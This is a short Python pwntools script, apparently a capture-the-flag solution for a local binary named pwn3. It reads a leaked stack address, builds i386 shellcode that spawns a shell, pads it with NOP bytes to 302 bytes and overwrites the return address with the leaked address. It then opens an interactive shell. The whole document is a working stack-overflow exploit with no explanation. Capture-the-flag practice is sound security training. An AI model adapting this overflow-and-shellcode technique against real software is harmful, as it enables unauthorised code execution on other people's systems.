from pwn import *

p = process(['./pwn3'])

context.arch = 'i386'

p.recvuntil(b"journey ")
stack = int(p.recvuntil(b"!\n",drop=True),16)

print(hex(stack))

shellcode = asm(shellcraft.i386.linux.sh())

payload = shellcode
payload += b'\x90'*(302-len(shellcode))
payload += p64(stack)

p.sendline(payload)
p.interactive()